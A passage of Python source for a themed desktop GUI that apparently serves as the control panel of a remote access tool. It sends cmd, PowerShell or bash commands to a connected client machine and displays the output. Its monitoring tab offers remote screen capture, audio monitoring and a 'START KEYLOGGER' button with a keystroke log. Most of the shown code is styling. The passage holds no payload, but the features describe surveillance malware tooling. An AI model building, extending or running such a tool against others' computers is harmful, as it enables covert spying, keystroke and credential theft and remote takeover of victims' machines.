                                hover_color=theme["hover_color"],
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                height=30,  # Taller buttons
                                corner_radius=0)  # Square corners for brutalist look
            else:
                if cmd in ['tasklist', 'systeminfo']:
                    self.btn_status = 'disabled'
                else:
                    self.btn_status = 'enabled'
                
                btn = ctk.CTkButton(cmd_buttons_frame, text=label, 
                                command=lambda c=cmd: self.quick_command(c),
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                height=30,  # Taller buttons
                                corner_radius=0, state=self.btn_status)  # Square corners for brutalist look
                
            btn.pack(side=tk.LEFT, padx=5, pady=5)
            
            # Add button to our list for theme updates
            self.command_buttons.append(btn)
            
            # Also track with theme manager
            if hasattr(self, 'theme_manager'):
                self.theme_manager.track_widget(btn)
        
        # Terminal mode selection with improved styling
        mode_frame = ctk.CTkFrame(cmd_buttons_frame, fg_color="transparent")
        mode_frame.pack(side=tk.RIGHT, padx=5, pady=5)
        
        mode_label = ctk.CTkLabel(mode_frame, text="Mode:", text_color=theme["fg_color"])
        mode_label.pack(side=tk.LEFT, padx=5)
        
        self.terminal_mode = tk.StringVar(value="cmd")
        mode_menu = ctk.CTkOptionMenu(mode_frame, 
                                    values=["cmd", "powershell", "bash"], 
                                    variable=self.terminal_mode,
                                    command=self.change_terminal_mode,
                                    fg_color=theme["button_color"],
                                    button_color=theme["accent_color"],
                                    button_hover_color=theme["hover_color"],
                                    dropdown_fg_color=theme["card_color"],
                                    dropdown_hover_color=theme["hover_color"],
                                    dropdown_text_color=theme["fg_color"],
                                    text_color=theme["fg_color"],
                                    corner_radius=0)  # Square corners
        mode_menu.pack(side=tk.LEFT)
        
        # Track mode menu
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(mode_menu)
        
        # Output terminal with enhanced styling
        terminal_frame = ctk.CTkFrame(self.command_frame, 
                                   fg_color=theme["card_color"],
                                   border_color=theme["border_color"] if "border_color" in theme else None,
                                   border_width=1 if "border_color" in theme else 0)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Determine terminal colors based on theme and mode
        terminal_bg, terminal_fg = self.get_terminal_colors()
        
        # Output text area with proper font for terminal
        self.terminal_output = scrolledtext.ScrolledText(
            terminal_frame, 
            wrap=tk.WORD, 
            background=terminal_bg, 
            foreground=terminal_fg, 
            font=("Consolas", 11),  # Slightly larger font
            borderwidth=0,
            highlightthickness=1,
            highlightbackground=theme["accent_color"],
            highlightcolor=theme["accent_color"],
            insertbackground=theme["accent_color"],  # Cursor color matches accent
            insertwidth=2
        )
        self.terminal_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Configure terminal text tags for different message types using theme colors
        self.terminal_output.tag_configure("error", foreground=theme["danger_color"])
        self.terminal_output.tag_configure("success", foreground=theme["success_color"])
        self.terminal_output.tag_configure("warning", foreground=theme["warning_color"])
        self.terminal_output.tag_configure("command", foreground=theme["accent_color"])
        self.terminal_output.tag_configure("output", foreground=terminal_fg)
        self.terminal_output.tag_configure("system", foreground=theme["info_color"])
        
        # Add initial welcome message
        self.terminal_output.insert(tk.END, "Command Shell\n", "system")
        self.terminal_output.insert(tk.END, "Type commands and press Enter to execute on the connected client.\n", "system")
        self.terminal_output.insert(tk.END, "Use Up/Down arrows to navigate command history.\n\n", "system")
        self.terminal_output.configure(state="disabled")
        
        # Command input area with enhanced features
        input_frame = ctk.CTkFrame(self.command_frame, 
                                fg_color=theme["card_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0)
        input_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Dynamic prompt label based on mode with vivid colors
        self.prompt_label = ctk.CTkLabel(input_frame, text="cmd>", width=80, 
                                    anchor="e", 
                                    font=("Consolas", 12, "bold"),  # Bold prompt
                                    text_color=theme["accent_color"])  # Use accent color for prompt
        self.prompt_label.pack(side=tk.LEFT, padx=5)
        
        # Command input with history support
        self.command_input = ctk.CTkEntry(input_frame, 
                                    fg_color=terminal_bg,
                                    text_color=terminal_fg,
                                    font=("Consolas", 12),
                                    border_width=1,
                                    border_color=theme["accent_color"],  # Matching accent color border
                                    corner_radius=0)  # Square corners
        self.command_input.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        # Bind events for command history and other features
        self.command_input.bind("<Return>", self.send_command)
        self.command_input.bind("<Up>", self.previous_command)
        self.command_input.bind("<Down>", self.next_command)
        self.command_input.bind("<Tab>", self.auto_complete)
        
        # Command history
        self.command_history = []
        self.history_index = -1
        
        # Auto-completion suggestions 
        self.common_commands = {
            "cmd": [
                "ipconfig", "systeminfo", "tasklist", "netstat", "dir", 
                "whoami", "hostname", "ping", "tracert", "net user",
                "net localgroup", "net share", "net view", "net start",
                "sfc /scannow", "dism", "reg query", "findstr", "type", 
                "cd", "copy", "move", "mkdir", "rmdir", "del"
            ],
            "powershell": [
                "Get-Process", "Get-Service", "Get-Item", "Get-Content", 
                "Get-WmiObject", "Get-EventLog", "Get-NetAdapter", 
                "Get-ComputerInfo", "Get-ChildItem", "Set-Location",
                "Write-Output", "Invoke-Command", "Invoke-WebRequest"
            ],
            "bash": [
                "ls", "cd", "pwd", "cat", "grep", "find", "ps", "top", 
                "netstat", "ifconfig", "mkdir", "touch", "chmod", "chown",
                "who", "whoami", "history", "uname", "echo", "ssh"
            ]
        }
        
        # Send button with enhanced styling
        send_btn = ctk.CTkButton(input_frame, text="Send", 
                            command=lambda: self.send_command(None),
                            fg_color=theme["accent_color"],
                            hover_color=theme["hover_color"],
                            text_color="#000000",  # Black text on accent for better contrast
                            border_color=theme["border_color"] if "border_color" in theme else None,
                            border_width=1 if "border_color" in theme else 0,
                            corner_radius=0,  # Square corners
                            height=32)
        send_btn.pack(side=tk.RIGHT, padx=5)
        
        # Create status bar for command results
        self.cmd_status_bar = ctk.CTkLabel(self.command_frame, text="Ready", height=20, 
                                        anchor="w", corner_radius=0,  # Square corners
                                        fg_color=theme["card_color"],
                                        text_color=theme["fg_color"])
        self.cmd_status_bar.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        # Track widgets with theme manager
        if hasattr(self, 'theme_manager'):
            self.theme_manager.track_widget(info_frame)
            self.theme_manager.track_widget(cmd_buttons_frame)
            self.theme_manager.track_widget(terminal_frame)
            self.theme_manager.track_widget(input_frame)
            self.theme_manager.track_widget(self.cmd_status_bar)
            self.theme_manager.track_widget(self.terminal_output, "scrolledtext")
            self.theme_manager.track_widget(self.command_input)
            self.theme_manager.track_widget(send_btn)
            self.theme_manager.track_widget(mode_label)
            self.theme_manager.track_widget(self.prompt_label)
            self.theme_manager.track_widget(self.connection_status_indicator)
            self.theme_manager.track_widget(client_label)
            self.theme_manager.track_widget(self.connected_client_label)
            self.theme_manager.track_widget(self.client_os_label)

    def update_command_buttons(self):
        """Update command buttons to match the current theme"""
        if hasattr(self, 'command_buttons') and hasattr(self, 'current_theme'):
            theme = self.THEMES[self.current_theme]
            
            for btn in self.command_buttons:
                btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"],
                    text_color=theme["fg_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0
                )

    def get_terminal_colors(self):
        """Get appropriate terminal colors based on theme and mode"""
        theme = self.THEMES[self.current_theme]
        mode = self.terminal_mode.get() if hasattr(self, 'terminal_mode') else "cmd"
        
        # Use theme's input_bg color as the base for terminals
        terminal_bg = theme["input_bg"] if "input_bg" in theme else theme["bg_color"]
        
        if mode == "cmd":
            # CMD - use theme colors
            return terminal_bg, theme["fg_color"]
        elif mode == "powershell":
            # PowerShell - use info color from theme
            return terminal_bg, theme["info_color"]
        elif mode == "bash":
            # Bash - use success color from theme
            return terminal_bg, theme["success_color"]
        else:
            # Default theme colors
            return theme["bg_color"], theme["fg_color"]

    def change_terminal_mode(self, mode):
        """Change the terminal mode and update the prompt"""
        theme = self.THEMES[self.current_theme]
        
        if mode == "cmd":
            self.prompt_label.configure(text="cmd>", text_color=theme["accent_color"])
        elif mode == "powershell":
            self.prompt_label.configure(text="PS>", text_color=theme["info_color"])
        elif mode == "bash":
            self.prompt_label.configure(text="bash$", text_color=theme["success_color"])
        
        # Update terminal colors based on the new mode
        terminal_bg, terminal_fg = self.get_terminal_colors()
        self.terminal_output.configure(background=terminal_bg, foreground=terminal_fg)
        self.command_input.configure(fg_color=terminal_bg, text_color=terminal_fg)
        
        # Add mode change notification
        self.terminal_output.configure(state="normal")
        self.terminal_output.insert(tk.END, f"\nSwitched to {mode} mode\n\n", "system")
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        # Clear command input
        self.command_input.delete(0, tk.END)
        
    def update_terminal_colors(self):
        """Update terminal colors when theme changes"""
        if hasattr(self, 'terminal_output') and hasattr(self, 'command_input'):
            theme = self.THEMES[self.current_theme]
            
            # Get new terminal colors based on current theme and mode
            terminal_bg, terminal_fg = self.get_terminal_colors()
            
            # Update terminal output area
            self.terminal_output.configure(
                background=terminal_bg, 
                foreground=terminal_fg,
                highlightbackground=theme["accent_color"],
                highlightcolor=theme["accent_color"],
                insertbackground=theme["accent_color"]
            )
            
            # Update command input
            self.command_input.configure(
                fg_color=terminal_bg,
                text_color=terminal_fg,
                border_color=theme["accent_color"]
            )
            
            # Update text tags
            self.terminal_output.tag_configure("error", foreground=theme["danger_color"])
            self.terminal_output.tag_configure("success", foreground=theme["success_color"])
            self.terminal_output.tag_configure("warning", foreground=theme["warning_color"])
            self.terminal_output.tag_configure("command", foreground=theme["accent_color"])
            self.terminal_output.tag_configure("output", foreground=terminal_fg)
            self.terminal_output.tag_configure("system", foreground=theme["info_color"])
            
            # Update prompt label color based on terminal mode
            if hasattr(self, 'prompt_label') and hasattr(self, 'terminal_mode'):
                mode = self.terminal_mode.get()
                if mode == "cmd":
                    self.prompt_label.configure(text_color=theme["accent_color"])
                elif mode == "powershell":
                    self.prompt_label.configure(text_color=theme["info_color"])
                elif mode == "bash":
                    self.prompt_label.configure(text_color=theme["success_color"])
                
    def quick_command(self, command):
        """Execute a quick command from the buttons"""
        if not self.current_client_socket:
            self.show_command_error("Not connected to any client")
            return
        
        # Set the command in the input field
        self.command_input.delete(0, tk.END)
        self.command_input.insert(0, command)
        
        # Execute the command
        self.send_command(None)

    def clear_terminal(self):
        """Clear the terminal output"""
        self.terminal_output.configure(state="normal")
        self.terminal_output.delete(1.0, tk.END)
        self.terminal_output.insert(tk.END, "Terminal cleared\n\n", "system")
        self.terminal_output.configure(state="disabled")
        self.cmd_status_bar.configure(text="Terminal cleared")

    def send_command(self, event):
        """Send a command to the connected client with enhanced features"""
        if not self.current_client_socket:
            self.show_command_error("Not connected to any client")
            return
        
        command = self.command_input.get().strip()
        if not command:
            return
        
        # Add command to history
        if not self.command_history or self.command_history[-1] != command:
            self.command_history.append(command)
        self.history_index = len(self.command_history)
        
        # Update terminal with command
        self.terminal_output.configure(state="normal")
        
        # Display prompt based on current mode
        prompt = self.prompt_label.cget("text") + " "
        self.terminal_output.insert(tk.END, prompt, "system")
        self.terminal_output.insert(tk.END, command + "\n", "command")
        
        # Show command is running
        self.cmd_status_bar.configure(text=f"Running: {command}...")
        
        try:
            # Special commands handled locally
            if command.lower() == "clear" or command.lower() == "cls":
                self.clear_terminal()
                self.command_input.delete(0, tk.END)
                return
            elif command.lower() == "exit" or command.lower() == "quit":
                self.disconnect_client()
                self.terminal_output.insert(tk.END, "Disconnected from client\n\n", "system")
                self.terminal_output.configure(state="disabled")
                self.command_input.delete(0, tk.END)
                return
            elif command.lower().startswith("cd ") and self.terminal_mode.get() != "bash":
                # Handle CD commands specially (they need to be persistent on Windows)
                try:
                    # For Windows clients, we need to handle CD specially
                    dir_path = command[3:].strip()
                    # Send a dir command to test if the path exists
                    test_cmd = f'if exist "{dir_path}" (echo DIR_EXISTS) else (echo DIR_NOT_FOUND)'
                    result, _ = self.send_cmd(self.current_client_socket, test_cmd)
                    result_text = result.decode().strip()
                    
                    if "DIR_EXISTS" in result_text:
                        # Set the current directory
                        change_dir_cmd = f'cd /d "{dir_path}" && echo Current directory: %cd%'
                        result, _ = self.send_cmd(self.current_client_socket, change_dir_cmd)
                        self.terminal_output.insert(tk.END, result.decode(), "success")
                    else:
                        self.terminal_output.insert(tk.END, f"The system cannot find the path specified: {dir_path}\n", "error")
                except Exception as e:
                    self.terminal_output.insert(tk.END, f"Error changing directory: {str(e)}\n", "error")
                    
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
                self.command_input.delete(0, tk.END)
                return
            
            # Modify command based on terminal mode
            if self.terminal_mode.get() == "powershell" and not command.lower().startswith("powershell "):
                # Wrap command in powershell
                exec_command = f'powershell -Command "{command}"'
            elif self.terminal_mode.get() == "bash" and not command.lower().startswith("bash "):
                # Wrap command in bash if available
                exec_command = f'bash -c "{command}"'
            else:
                exec_command = command
            
            # Send command to client
            start_time = time.time()
            result, size = self.send_cmd(self.current_client_socket, exec_command)
            end_time = time.time()
            
            # Display result
            execution_time = end_time - start_time
            
            # Insert command output
            self.terminal_output.insert(tk.END, result.decode(), "output")
            
            # Add extra newline for readability
            if not result.decode().endswith('\n'):
                self.terminal_output.insert(tk.END, "\n")
            self.terminal_output.insert(tk.END, "\n")
            
            # Update status bar
            self.cmd_status_bar.configure(text=f"Command completed in {execution_time:.2f} seconds (Size: {self.format_size(size)})")
            
        except ConnectionError as e:
            self.terminal_output.insert(tk.END, f"Connection Error: {str(e)}\n", "error")
            self.cmd_status_bar.configure(text="Connection Error")
            # Update connection status
            self.update_connection_status(False)
            
        except Exception as e:
            self.terminal_output.insert(tk.END, f"Error: {str(e)}\n", "error")
            self.cmd_status_bar.configure(text=f"Error: {str(e)}")
        
        # Scroll to the end and disable editing
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        # Clear command input
        self.command_input.delete(0, tk.END)

    def previous_command(self, event):
        """Navigate to the previous command in history"""
        if not self.command_history:
            return "break"
            
        if self.history_index > 0:
            self.history_index -= 1
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, self.command_history[self.history_index])
            
        return "break"  # Prevent default behavior

    def next_command(self, event):
        """Navigate to the next command in history"""
        if not self.command_history:
            return "break"
            
        if self.history_index < len(self.command_history) - 1:
            self.history_index += 1
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, self.command_history[self.history_index])
        elif self.history_index == len(self.command_history) - 1:
            # At the end of history, clear the input
            self.history_index = len(self.command_history)
            self.command_input.delete(0, tk.END)
            
        return "break"  # Prevent default behavior

    def auto_complete(self, event):
        """Provide auto-completion for common commands"""
        current_text = self.command_input.get()
        current_mode = self.terminal_mode.get()
        
        # Get appropriate command list based on mode
        command_list = self.common_commands.get(current_mode, [])
        
        # Find matching commands
        matches = [cmd for cmd in command_list if cmd.lower().startswith(current_text.lower())]
        
        if matches:
            # Replace with the first match
            self.command_input.delete(0, tk.END)
            self.command_input.insert(0, matches[0])
            
            # If there are multiple matches, show them in the terminal
            if len(matches) > 1:
                self.terminal_output.configure(state="normal")
                self.terminal_output.insert(tk.END, "\nMatches: " + ", ".join(matches) + "\n\n", "system")
                self.terminal_output.see(tk.END)
                self.terminal_output.configure(state="disabled")
        
        return "break"  # Prevent default behavior

    def show_command_error(self, message):
        """Display command error in the terminal and status bar"""
        self.terminal_output.configure(state="normal")
        self.terminal_output.insert(tk.END, f"Error: {message}\n\n", "error")
        self.terminal_output.see(tk.END)
        self.terminal_output.configure(state="disabled")
        
        self.cmd_status_bar.configure(text=f"Error: {message}")

    def update_connection_status(self, connected=True):
        """Update the connection status indicator"""
        theme = self.THEMES[self.current_theme]
        
        if connected:
            self.connection_status_indicator.configure(text="●", text_color=theme["success_color"])
        else:
            self.connection_status_indicator.configure(text="●", text_color=theme["danger_color"])

    def format_size(self, size_bytes):
        """Format byte size to human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB', 'TB']:
            if size_bytes < 1024.0:
                return f"{size_bytes:.2f} {unit}"
            size_bytes /= 1024.0
        return f"{size_bytes:.2f} PB"

        
    def setup_monitoring_tab(self):
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create tab control with brutalist styling
        monitor_notebook = ttk.Notebook(self.monitoring_frame, style="Custom.TNotebook")
        monitor_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Screen tab with brutalist styling
        screen_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(screen_frame, text="SCREEN")  # All caps for brutalist look
        
        # Top control panel with brutalist styling
        screen_controls = ctk.CTkFrame(screen_frame, 
                                    fg_color=theme["card_color"], 
                                    corner_radius=0,  # Square corners for brutalist look
                                    border_color=theme["border_color"] if "border_color" in theme else None,
                                    border_width=1 if "border_color" in theme else 0)
        screen_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        screen_title = ctk.CTkLabel(screen_controls, text="SCREEN CAPTURE CONTROLS",  # All caps
                                font=ctk.CTkFont(size=14, weight="bold"),
                                text_color=theme["fg_color"])
        screen_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        screen_separator = ttk.Separator(screen_controls, orient='horizontal')
        screen_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        screen_btn_container = ctk.CTkFrame(screen_controls, fg_color="transparent")
        screen_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        # Store monitoring buttons for theme updates
        self.monitoring_buttons = []
        
        # Enhanced buttons with brutalist styling
        self.start_screen_btn = ctk.CTkButton(screen_btn_container, text="START SCREEN CAPTURE",  # All caps
                                            command=self.start_screen_capture,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            height=30)  # Taller button
        self.start_screen_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.start_screen_btn)
        
        self.stop_screen_btn = ctk.CTkButton(screen_btn_container, text="STOP SCREEN CAPTURE",  # All caps
                                            command=self.stop_screen_capture, 
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            height=30)  # Taller button
        self.stop_screen_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.stop_screen_btn)
        
        # Add a frame for the image display with brutalist styling
        self.screen_display_frame = ctk.CTkFrame(screen_frame, 
                                            fg_color=theme["card_color"], 
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.screen_display_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Screen capture display with brutalist styling
        self.screen_display = tk.Label(self.screen_display_frame, text="No screen capture active", 
                                    background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                    foreground=theme["fg_color"],
                                    font=("Consolas", 12))  # Monospace font for tech feel
        self.screen_display.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
        
        # Audio tab with brutalist styling
        audio_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(audio_frame, text="AUDIO")  # All caps
        
        # Top control panel for audio with brutalist styling
        audio_controls = ctk.CTkFrame(audio_frame, 
                                   fg_color=theme["card_color"], 
                                   corner_radius=0,  # Square corners
                                   border_color=theme["border_color"] if "border_color" in theme else None,
                                   border_width=1 if "border_color" in theme else 0)
        audio_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        audio_title = ctk.CTkLabel(audio_controls, text="AUDIO MONITORING CONTROLS",  # All caps
                                font=ctk.CTkFont(size=14, weight="bold"),
                                text_color=theme["fg_color"])
        audio_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        audio_separator = ttk.Separator(audio_controls, orient='horizontal')
        audio_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        audio_btn_container = ctk.CTkFrame(audio_controls, fg_color="transparent")
        audio_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        self.start_audio_btn = ctk.CTkButton(audio_btn_container, text="START AUDIO MONITORING",  # All caps
                                        command=self.start_audio_monitoring,
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        corner_radius=0,  # Square corners
                                        border_width=1,
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        height=30)  # Taller button
        self.start_audio_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.start_audio_btn)
        
        self.stop_audio_btn = ctk.CTkButton(audio_btn_container, text="STOP AUDIO MONITORING",  # All caps
                                        command=self.stop_audio_monitoring, 
                                        state="disabled",
                                        fg_color=theme["button_color"],
                                        hover_color=theme["hover_color"],
                                        text_color=theme["fg_color"],
                                        corner_radius=0,  # Square corners
                                        border_width=1,
                                        border_color=theme["border_color"] if "border_color" in theme else None,
                                        height=30)  # Taller button
        self.stop_audio_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.stop_audio_btn)
        
        # Audio visualization placeholder with brutalist styling
        self.audio_display_frame = ctk.CTkFrame(audio_frame, 
                                            fg_color=theme["card_color"], 
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.audio_display_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Audio visualization placeholder
        self.audio_display = tk.Label(self.audio_display_frame, text="No audio monitoring active", 
                                   background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                   foreground=theme["fg_color"],
                                   font=("Consolas", 12))  # Monospace font
        self.audio_display.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Keyboard tab with brutalist styling
        keyboard_frame = ctk.CTkFrame(monitor_notebook, fg_color=theme["bg_color"])
        monitor_notebook.add(keyboard_frame, text="KEYBOARD")  # All caps
        
        # Top control panel for keyboard with brutalist styling
        keyboard_controls = ctk.CTkFrame(keyboard_frame, 
                                      fg_color=theme["card_color"], 
                                      corner_radius=0,  # Square corners
                                      border_color=theme["border_color"] if "border_color" in theme else None,
                                      border_width=1 if "border_color" in theme else 0)
        keyboard_controls.pack(fill=tk.X, padx=10, pady=10)
        
        # Add title to the control panel
        keyboard_title = ctk.CTkLabel(keyboard_controls, text="KEYBOARD MONITORING CONTROLS",  # All caps
                                   font=ctk.CTkFont(size=14, weight="bold"),
                                   text_color=theme["fg_color"])
        keyboard_title.pack(anchor=tk.W, padx=10, pady=(5, 0))
        
        # Create a separator
        keyboard_separator = ttk.Separator(keyboard_controls, orient='horizontal')
        keyboard_separator.pack(fill=tk.X, padx=10, pady=5)
        
        # Button container for better alignment
        keyboard_btn_container = ctk.CTkFrame(keyboard_controls, fg_color="transparent")
        keyboard_btn_container.pack(fill=tk.X, padx=10, pady=5)
        
        self.start_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="START KEYLOGGER",  # All caps
                                            command=self.start_keylogger,
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            height=30)  # Taller button
        self.start_keyboard_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.start_keyboard_btn)
        
        self.stop_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="STOP KEYLOGGER",  # All caps
                                            command=self.stop_keylogger, 
                                            state="disabled",
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            height=30)  # Taller button
        self.stop_keyboard_btn.pack(side=tk.LEFT, padx=5, pady=5)
        self.monitoring_buttons.append(self.stop_keyboard_btn)
        
        # Add clear button
        self.clear_keyboard_btn = ctk.CTkButton(keyboard_btn_container, text="CLEAR LOG",  # All caps
                                            command=lambda: self.keyboard_log.delete(1.0, tk.END),
                                            fg_color=theme["button_color"],
                                            hover_color=theme["hover_color"],
                                            text_color=theme["fg_color"],
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None,
                                            height=30)  # Taller button
        self.clear_keyboard_btn.pack(side=tk.RIGHT, padx=5, pady=5)
        self.monitoring_buttons.append(self.clear_keyboard_btn)
        
        # Improved keyboard log with brutalist styling
        self.keyboard_log_frame = ctk.CTkFrame(keyboard_frame, 
                                            fg_color=theme["card_color"], 
                                            corner_radius=0,  # Square corners
                                            border_width=1,
                                            border_color=theme["border_color"] if "border_color" in theme else None)
        self.keyboard_log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.keyboard_log = scrolledtext.ScrolledText(self.keyboard_log_frame, 
                                                   wrap=tk.WORD, 
                                                   background=theme["input_bg"] if "input_bg" in theme else theme["bg_color"], 
                                                   foreground=theme["fg_color"],
                                                   font=("Consolas", 10),  # Monospace font
                                                   borderwidth=0,
                                                   highlightthickness=1,
                                                   highlightbackground=theme["accent_color"],
                                                   insertbackground=theme["accent_color"])
        self.keyboard_log.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Track all widgets with theme manager
        if hasattr(self, 'theme_manager'):
            # Track frames
            self.theme_manager.track_widget(monitor_notebook, "notebook")
            self.theme_manager.track_widget(screen_frame)
            self.theme_manager.track_widget(screen_controls)
            self.theme_manager.track_widget(self.screen_display_frame)
            self.theme_manager.track_widget(audio_frame)
            self.theme_manager.track_widget(audio_controls)
            self.theme_manager.track_widget(self.audio_display_frame)
            self.theme_manager.track_widget(keyboard_frame)
            self.theme_manager.track_widget(keyboard_controls)
            self.theme_manager.track_widget(self.keyboard_log_frame)
            
            # Track labels
            self.theme_manager.track_widget(screen_title, "label")
            self.theme_manager.track_widget(audio_title, "label")
            self.theme_manager.track_widget(keyboard_title, "label")
            
            # Track buttons
            for btn in self.monitoring_buttons:
                self.theme_manager.track_widget(btn)
            
            # Track displays
            self.theme_manager.track_widget(self.screen_display, "label")
            self.theme_manager.track_widget(self.audio_display, "label")
            self.theme_manager.track_widget(self.keyboard_log, "scrolledtext")

    def update_monitoring_buttons(self):
        """Update all monitoring buttons to match the current theme"""
        if hasattr(self, 'monitoring_buttons') and hasattr(self, 'current_theme'):
            theme = self.THEMES[self.current_theme]
            
            for btn in self.monitoring_buttons:
                # Skip disabled buttons (keep their state)
                state = btn.cget("state")
                
                btn.configure(
                    fg_color=theme["button_color"],
                    hover_color=theme["hover_color"],
                    text_color=theme["fg_color"],
                    border_color=theme["border_color"] if "border_color" in theme else None,
                    border_width=1 if "border_color" in theme else 0,
                    corner_radius=0  # Ensure square corners for brutalist look
                )
                
                # Restore state
                if state == "disabled":
                    btn.configure(state="disabled")
        
    def setup_settings_tab(self):
        """Set up an enhanced settings tab with comprehensive configuration options"""
        # Get theme colors
        theme = self.THEMES[self.current_theme]
        
        # Create a main container with scrolling capability
        main_container = ctk.CTkScrollableFrame(self.settings_frame, 
                                             fg_color="transparent",
                                             corner_radius=0)  # Square corners
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Store settings buttons for theme updates
        self.settings_buttons = []
        
        # ===== SERVER SETTINGS SECTION =====
        server_settings_frame = ctk.CTkFrame(main_container, 
                                          fg_color=theme["card_color"], 
                                          corner_radius=0,  # Square corners
                                          border_color=theme["border_color"] if "border_color" in theme else None,
                                          border_width=1 if "border_color" in theme else 0)
        server_settings_frame.pack(fill=tk.X, padx=5, pady=5)
        
        server_header = ctk.CTkLabel(server_settings_frame, text="SERVER SETTINGS",  # All caps
                                font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]),
                                text_color=theme["fg_color"])
        server_header.pack(anchor="w", padx=15, pady=10)
        
        # Server default address settings
        address_frame = ctk.CTkFrame(server_settings_frame, fg_color="transparent")
        address_frame.pack(fill=tk.X, padx=15, pady=5)
        
        # Default IP
        ip_row = ctk.CTkFrame(address_frame, fg_color="transparent")
        ip_row.pack(fill=tk.X, pady=3)
        
        ip_label = ctk.CTkLabel(ip_row, text="Default IP:", width=150, text_color=theme["fg_color"])
        ip_label.pack(side=tk.LEFT, padx=5)
        
        self.default_ip_entry = ctk.CTkEntry(ip_row, width=200, 
                                        fg_color=theme["input_bg"] if "input_bg" in theme else theme["bg_color"],
                                        text_color=theme["fg_color"],
                                        border_color=theme["border_color"] if "border_color" in theme else theme["accent_color"],
                                        border_width=1,
                                        corner_radius=0)  # Square corners
        self.default_ip_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.default_ip_entry.insert(0, self.ip)
        
        ip_help_btn = ctk.CTkButton(ip_row, text="?", width=30, height=30,
                                corner_radius=0,  # Square corners
                                fg_color=theme["button_color"],
                                hover_color=theme["hover_color"],
                                text_color=theme["fg_color"],
                                border_color=theme["border_color"] if "border_color" in theme else None,
                                border_width=1 if "border_color" in theme else 0,
                                command=lambda: self.show_tooltip("IP Address", 
                                                                "The default IP address the server will listen on.\n\n"
